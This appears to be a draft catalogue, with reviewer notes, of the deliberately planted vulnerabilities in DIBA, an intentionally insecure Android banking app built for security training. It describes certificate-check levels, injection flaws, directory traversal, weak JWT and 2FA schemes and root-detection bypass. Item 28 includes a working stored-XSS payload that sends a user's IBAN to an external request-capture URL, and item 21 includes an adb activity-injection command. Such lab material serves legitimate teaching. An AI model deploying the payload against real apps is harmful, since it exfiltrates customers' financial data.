a# Vulnerabilities in DIBA

This document lists all vulnerabilities that are present in DIBA, including required preparations, the goals that should be achieved to demonstrate successful exploitation, and some helpful hints.

Most of the vulnerabilities are within the app. However, there are also a few vulnerabilities on the server-side. Also the requirements for an attacker to exploit the different vulnerabilities vary. In some cases, the attacker is simply the user of the app, in other cases the attacker must get (temporarily) access to device of another user, sometimes the attacker must control another app on the device of another user, and in a few cases, the attacker even needs root access to the device.

The vulnerabilites are rated as *easy*, *medium* and *hard*, giving an indication for the complexity of exploiting them. This complexity rating reflects the general effort and knowledge (also of helpful tools) required for exploitation. 

### General issues

Investments: "Amount:" should be "Amount".

Make sure to adapt the text in "About App". And also the screenshot. => Marc will do this

Settings screen needs better formatting.


### 1: Certificate Check Security

The DIBA server uses a certificate (and corresponding private key) to authenticate itself during the TLS handshake performed between the DIBA app and the DIBA server. This certificate is identified as **DIBA server certificate**. The certificate is issued (signed) by a custom root CA certificate identified as **DIBA CA certificate**. The latter is the one you have to install in the Android trust store (see [README](README.md)) so that DIBA server certificate is considered trustworthy. 

In the Meta Settings, five different levels can be selected that specify the security of the check that is done by the app when verifying the DIBA server certificate received during the TLS handshake. Depending in the level, it is more or less difficult to intercept the network communication between app and server, either as a man in the middle (MITM) or when you are using an interceptor proxy to analyse and/or modify the exchanged data.

- **Level 1**: The certificate is not checked at all. This implies that a MITM or interceptor proxy can use any certificate (and corresponding private key) to intercept network communication.
- **Level 2**: The app checks the identity (subject) of the certificate and whether the certificate has not expired yet. To intercept network communication, one can use any certificate (and corresponding private key) that contains the correct subject and that has not yet expired.
- **Level 3**: This inluces the checks from level 2 and in addition, it is checked that the certificate is signed by any one of the certificates in the Android trust store. To intercept network communication, one needs a certificate (and corresponding private key) signed by any of the certificates in the Android trust store. Alternatively, one can create a certificate using an own root certifcate and install this root certificate in the Android trust store.
- **Level 4**: This includes the checks from level 2 and in addition, it is checked whether the certiticate is signed by the DIBA CA certificate. This means the certificate is pinned to the issuing CA. To intercept network communication, one needs a certificate (and corresponding private key) signed by the DIBA CA certificate.
- **Level 5**: This includes the checks from level 2 and in addition, it is checked whether the certiticate corresponds exactly to the DIBA server certificate. This means the certificate is pinned to the server certificate. To intercept network communication, one needs to use the original DIBA server certificate (and corresponding private key).

**Check**: Works

### 2: Investments VIP Code (medium)
To do investments, a VIP code is required that can be purchased from the bank. However, due to a vulnerability, it is possible to find out the correct VIP code without having to purchase it.

**Goal:** Find out the valid VIP access code and get access to the Investstments functionality by entering the code.

**Check**: Works, but old solution description seems to be overly complicated.

### 3: Remember Me (medium)
For usabiliy reasons, DIBA provides a *Remember me* functionality so that during the next login, the credentails are already pre-filled. Obviously, these credentials must be stored somewhere on the device and doing this in a secure way is hard.

**Preparation:** Login with email *h@cker* and password *damninsecure* and check the *Remember me* checkbox.

**Goal:** Get the password of *h@cker* from the device assuming you don't know the password.

**Check**: Works.

### 4: SQL Injection (easy)
The *Messages* functionality allows to send and receive messages to/from the bank. The messages are cached locally on the device so that they can be viewed even if there's no network connection. As the app can be used by different users on the same device, messages of multiple users may be cached. Therefore, for confidentiality reasons, a user should only get access to his own messages. Unfortunately, this was not implemented correctly.

**Goal:** Abuse the search field to get access to messages of other users on the same device.

**Check**: Works, but The five predefined messages should by form sender (Alice, right side) and from bank (Bob, left side).
Also, formatting is not good. Use same formatting as in version 1.4.

### 5: Clipboard Danger (easy/medium)
During payment, DIBA allows to load a payment slip from the SD-Card. You can assume that the user receives the payment slip by e-mail from where it can be copied to the SD-Card so it can be imported in DIBA. By selecting *Transfer Payment Slip*, one can copy data from the payment slip (e.g., the recipient) to the corresponding field of the payment using standard the standard Android copy-paste functionality. Assuming an attacker controls another app on the device, he can get access to possibly sensitive payment data copied by the user.

**Goal (easy):** As a proof of concept, try to get access to copied payment data by using any other of the apps available on the Android system.

**Goal (medium):** Develop an app that logs all data that is copied in other apps (which obviously includes payment data copied in the DIBA app).

**Check**: Works

### 6: Exported Content Provider (medium)
The DIBA app contains an exported content provder that allows to change the app settings. One can assume that this was intentionally added during development so that settings can easily be changed using a separate app, but it was forgotten to remove this before publishing the app.

**Goal:** Develop an app that allows to set at least one of the DIBA app settings.

**Check**: Works

### 7: Intent Redirection (hard)
In the settings, the developers forgot to remove a debugging setting that allows specifying the activity that is used to confirm a payment. Per default, this is set to the payment confirmation activity of the DIBA app and therefore, everything works as intended. However, the values can be changed so they point to a another activity in another app and because of vulnerability 6, the settings can not only be changed within the DIBA app, but also by another app on the same device. Overall, this means that an attacker, assuming he controls an app on the device, can interfere with the payment data that is sent (in an intent) from the *Make a Payment* activity to the *Accept the Payment* activity.

**Goal:** Develop an app that provides an activity that can receive the intent sent from the *Make a Payment* activity, that canges the recipient of a payment to *attacker@mail.com*, and that forwards the modified intent to the *Accept the Payment* activity. When tapping on *Show Details*, you should then see the modified payment data.

**Check**: Works

Note: Make sure solution chapter describes exploitation assuming the attacker only has the DIBA apk file, not the source code.

### 8: Logging Sensitive Information (easy)
Apps should never log sensitive data as this unnecessarily exposes this data so an attacker can possibly access it. The DIBA app, unfortunately, logs a lot of sensitive information to the central Android logging facility, probably as a leftover from development. If an attacker gets access to your device, he can use adb to get access to the logged data.

**Goal:** Get access to logged credentials (email and password).

**Check**: Works

### 9: Exported Activity Alias (easy/medium)
The activity to view the investments in not exported. However, there's an alias for this activity, which is exported, and as a result of this, the original activity also gets exported. This means that it can be directly accessed without following the user interface of the app, i.e., without logging in. Note that in this case, assming an attacker gets temporary access to the device of a DIBA user that is currently not logged is not really beneficial as no investments will be shown. However, there are certainly apps where such a vulnerability may provide access to more interesting functionality or data and the main intention of the vulnerability is to demonstrate that an activity can be unintentionally made exportable if the developer uses activity aliases in a wrong way. 

**Goal (easy):** Without being logged into the DIBA app, use adb to directly start and access the activity to view the investments.

**Goal (medium):** Develop an app that starts the investment activity without being logged into the DIBA app.

**Check**: Works

Note: Explot app still uses path to inbank, not DIBA.

### 10: Directory Traversal I - Read (easy)
During payment, DIBA allows to load a payment slip from the SD-Card. This is implemented in an insecure way that allows to read the content of any file that is accessible by the permissions of the running DIBA app. If an attacker gets (temporarily) access to your device, this may allow him to access sensitive information.

**Goal:** Abuse this functionality to get access to the content of the file *loginPreferences.xml* in the shared preferences of the DIBA app.

**Check**: Works

Shouldn't the Load/Save Icons be swapped?

### 11: Directory Traversal II - Read/Write (easy)
During payment, DIBA allows to load/save a payment slip from/to the SD-Card. This is implemented in an insecure way that allows you to read and write the content of any file that is accessible by the permissions of the running DIBA app. This may allow a user to change settings of the app in a way as it was not intended by the app developers.

**Goal:** Abuse this functionality to first read the contents of the file *ch.zhaw.securitylab.DIBA_preferences.xml* in the shared preferences of the DIBA app. The next steps depend on whethter you already have access to make investments (via the VIP code):
* In case you don't have access to make investments yet, add the entry *<boolean name="VIP" value="true" />* to the *map* element and overwrite the file with the new content. This should grant you access to make investments.
* If you already have access to make investments, then set the value of the *VIP* attribute to *false* and overwrite the file with the new content. As a result of this, you no longer should have access to make investments.

**Check**: Works

### 12: Directory Traversal III - Read/Write (easy)
This uses the same vulnerability as vulnerability 11 and is only intended to show that data can also be copied to locations so it can be access by other apps.

**Goal:** Abuse the load/save payment slip functionality to copy any file from the shared preferences to the SD-Card. Once this has been done, check (e.g. using adb) whethter the file was indeed copied to the SD-Card.

**Check**: Works

### 13: Weak Report Encryption (hard)
At the top right of the *Home* screen, thers's a bug-shaped button. Clicking this button creates a report that contains sensitive information. Due to this sensitive information, the report is encrypted before it is stored on the SD-Card. From there, the user can send it to the DIBA bank, e.g., by mail.

**Goal:** Find out the encryption scheme and the key that is used to encrypt the bug report. Then, use this information to decrypt the report.

**Check**: Works, can be decrypted using https://cryptii.com/pipes/vigenere-cipher

Note: Code is obfuscated and hard to learn. However, looking at the encrypted report, one can also guess that a Vigenere cipher is used. So no need to analyze the obfuscated code to find out what is going on. This should also be stated in the solution chapter.

### 14: Login Mimic (easy)
If login is successful, the DIBA server sends a JSON Web Token (JWT) to the app, which is then included in every subsequent request by the app to link the request to the authenticated user. While JWTs in general are considered secure assuming they are used correctly, it's also possible to use them in an insecure way - which is what happened in DIBA.

**Goal:** Get a JWT (e.g., by using an intercepor proxy) and analyse it's content (e.g., by using https://jwt.io). Identify one major problem with the content of the token and what the security implications are.

**Check**: Works

### 15: Recently Used Apps (easy)
In Android, when displaying the currently running apps, screenshots are displayed that are taken when an app leaves the foreground. As the DIBA app sometimes shows sensitive information, it has been implemented in a way to make sure that 
Some screens of the DIBA app contain sensitive information. Therefore, the app was implemented so that no screenshot is taken when it leaves the foreground. As a result of this, no details are shown when viewing the currently running apps. However, in some places of the DIBA app, this was forgotten. 

**Goal:** Find two screens with possibly sensitive information where screenshots are taken when the app leaves the foreground in the sense that the screenshots are then shown when displaying the currently running apps.

**Check**: Works

### 16:

This number is missing from the solution chapter => not existing (?)

### 17: Back Button Log Clearing (easy)
Usually, the back button shows the previously used screen. This can be security critical in some situation. E.g., in the DIBA app, after a user has logged out, it should not be possible to use the back button to get access to previously used screens as they may reveal sensitive information to anotehr user who gets access to the device. The DIBA app has two log out functionalitis, one via the menu on the top left and the other via the home screen. Only one of the is implemented ion a secure way.

**Goal:** Find a way such that - after logging out - sensitive information can be accessed by using the back button.

**Check**: Works

Sequence: Login - Payments - Home - Log-out/Side Drawer - back - back => PAYMENTS!


### 18: Input validate in make payment activity

Check this out. I also sent you a video as there's a strange behaviour with payments if the proxy is used. It may have to do with timeouts in the app?

https://drive.switch.ch/index.php/s/av94lsXfhJkPjwX

### 19: Developer entrance (medium)
As a leftover from development to make testing easier, a backdoor was added to the login screen that allows to tap on the DIBA logo to get access to the authenticated area without having to log in. The developers deactivated the backdoor, but it was simply deactivated using a flag in the code and the actual code was left in. This means an attacker can easily reactivate the backdoor.

**Goal:** Adapt the app so that the backdoor is working again so the logo can be tapped to enter the authenticated are.

**Hint:** To do this, you have to decompile the app using *apktool*, adapt a specific setting, recompile the code again using *apktool* and sign it with *apksigner*.

**Remark**: Of course, being in the authenticated area of the app without having logged in (and having received a JWT) does not really provide access to sensitive information. Therefore, this vulnerability mainly serves to demonstrate how easy it is to re-activate code that was "deactivated" by the developers with a simpkle setting. And also, an attacker can of course always adapt the code to add functionality at will (in this case, getting directly to the authenticated area), but in that case, he has at least adapt the code of the app, whoch can be made more difficult using code obfuscation. 

**Check**: Works

### 20: App Backup (medium)
In the file *AndroidManifest.xml* that is part of every app, the developer can specify whether backups via adb are allowed. In the case of the DIBA apps, backups are permitted. This is convenient, but introduces risks, as it allows the user to easily change some setting that shouldn't directly be accessible to the user and if an attacker manages to get access to a backup, he may get access to sensitive information.

**Goal:** Do a backup of the DIBA app via adb and inspect the backed up data to learn what it contains in general and whether it contains sensitive data.

**Check**: Works

### 21: Fragment injection

I don't undersdtand this one.

Using the followong when not being logged in crashes the app:
am start -n "ch.zhaw.securitylab.dibach.zhaw.securitylab.diba.activity.unauth.ActivityCredentials" -e credentials_fragment ch.zhaw.securitylab.diba.activity.unauth.FragmentChange

### 22: Insecure services

TBD

### 23: Weak JWT MAC Secret (medium)
The JSON Web Token (JWT) that is created by the DIBA server uses a weak secret for the MAC. If an attacker manages to find this secret, he can create valid JWTs for DIBA.

**Goal:** Get a JWT (e.g., by using an intercepor proxy) and crack the MAC password.

**Check**: Works

### 24: Exploitimg Saved Foreign Login Credentials (easy)
The DIBA app allows to store the credentials using the *Remember Me* functionality. This directly implies that if a user stores the credentials and if an attacker gets access to the device, the attacker can log in and can use the app with the identity of the user.

**Goal:** Log in using the credentials that have been entered and stored before (using the *Remember Me* functionality) and use the app with identity of the corresponding user. Obviously, this is trivial to do.

**Check**: Works

### 25: SQLite Database (medium)
Android apps can use internal SQlite databases. The DIBA app, for instance, uses such a database to store the made inbvestments for convenience so that they do not have to be read from the server whenever the user wants to view the made investments. If an attacker gets access to the device, however, he can get the database and read its potentially sensitive content.

**Preparation:** Make at least one investment so that the database contains some content.

**Goal:** Get access to the database that stores the investments and list the made investments.

**Check**: Works

### 26: Native Language Library (hard)
Vulnerability 27 (Encrypted SQLite Database) uses an encrypted database to locally store the made payments. The key that used for encryption is hidden in the app.

**Goal:** Find the key. When solving vulnerability 27, you'll learn whethter you have found the right key.

**Check**: Works

Note: The solution contains 
Find where the payment database is created.
find . -type f -exec grep -i paymentdb {} +
=> This is not so obvious. Why paymentdb?

### 27: Encrypted SQLite database (hard)
Just like with investments (see vulnerability 25), a local database is also used to store the made payments. This time, the developers tried to come up with a more secure solution by encrypting the database with a key hidden in the app. However, assuming an attacker finds this key and gets access to the device, he can still get the database and read its potentially sensitive content.

**Preparation:** Make at least one payment so that the database contains some content. Also, first exploit vulnerability 26 to get the hidden key.

**Goal:** Get access to the database that stores the paymants and list the made payments by using the correct key.

**Hint:** In the DIBA app, encryption of the payment database is done using [SQLCipher](https://www.zetetic.net/sqlcipher/). Note that this vulnerability is not because a problem of SQLCipher, but because the attacker can get access to the encryption key.

**Check**: Could not test as I couldn't build SQLCipher

### 28: WebView Cross-Site Scripting (medium)
The DIBA app provides a survey to banking customers so they can provide some feedback. This survey is implemented using a WebView that contains a stored Cross-Site Scripting (XSS) vulnerability.

**Goal:** Exploit the vulnerability so that whenever a user opens the survey screen, his IBAN (which is included at the top of the screen) is sent in a request to a host controlled by the attacker.

**Hint:** An easy way to capture request is by using [PostBin](https://postb.in).

**Check**: Works

Note: I only could do string concatenation with the concat method, but not with "+":

new Image().src = encodeURI("https://postb.in/1589184632761-8206421809736?iban=".concat(document.getElementById('iban').text));
</script>


### 29: Cracking Weak Password

Uses no salt, right?

What is the correct password?

### 30: Root Detection Bypass (hard)
The DIBA app cointains a simple root detection mechanism. Whenever the app is started, it checks whether the Android device is rooted and displays a message if this is the case. In reality, the app would be now terminated to prevent its usage on rooted (and therefore less secure) devices. However, as a user has full control over the app, he can adapt it by removing the root detection check and as a result of this, the app can also be used on rooted devices.

**Goal:** Adapt the app and remove the rooted detection check. As a result of this, the message after starting the app should no longer appear.

**Hint:** To do this, you have to decompile the app using *apktool*, adapt the code, recompile the app again using *apktool* and sign it with *apksigner*.

**Check**: Works

Note: Finding this in smali is very difficult. How can the user find the correct code location?

Question: This is a real rooted detection check, right? So it runs only on truly rooted devices (or the VM, where su is available)

Note: Rooted detection should be OFF in the settings per default. Also, it should be in the Meta-Setting, not the Settings (?)

### 31: Local Command Injection
In the Meta-Settings, there's a *Ping Server* functionality to ping the server using the configured IP address. This uses the *ping* command in the Android operating system. The output of the ping command can be seen in the Android log. This functionality contains a command injection vulnerability that allows an attacker to execute arbitrary command in the Android system.

**Goal:** Exploit the vulnerability so that the content of the file *loginPreferences.xml* in shared preferences of the DIBA app is written to the Android log.

**Check**: Works

Note: Missing / in solution: && cat data/data... should be && cat /data/data...

Note: But this means the meta ssettings are now exploitable, so the entry "Non-attackable screens" is no lomger correct.

### 32: Two-Factor Authentication I - Replaying Codes (easy)
To confirm a paymemnt, the user gets a payment confirmation code by SMS. Note that the SMS is simulated and written to the server output. This code is generated and used in an insecure way. A first problem is that it is not bound to a specific payment and that it can be used for multiple payments.

**Goal:** Exploit the vulnerability by reusing the payment code of a previous payment to confirm anotehr payment. Obviously, this is trivial to do.

**Check**: Works

Addd "stars" in the server log before and after the SMS content

The text in the app should be:

A confirmation code was sent to you by SMS (you can get it from to the server output).
Enter the code to conform the payment.
(To prove that you cracked the code generation algorithm, enter the code that will be used 2020-02-31 12:00:00. If the paymant is accepted, you have succeeded!)

### 33: Two-Factor Authentication II (easy)

Note: I wanted to add a vulnerability where a MITM modifies the payment when it is sent the second time (with the code). Bt it does not work as the server still uses the anount from the foirst payment. So why is the payment data sent a second time?


### 34: Two-Factor Authentication III - Weak Code Generation (medium)
Confirmation codes should be random so an attacker cannot predict them. n the case iof DIBA, however, they are not really created in a random way, although they appear quite random when looking at them.

**Goal:** Crack the confirmation code generation algorithm. If you think you have cracked it, enter the confirmation code that would be used at 2030-01-31 12:00:00 in the code field and accept the payment. If the payment is accepted, you have successfully cracked the code generation algorithm.

**Check**: Works







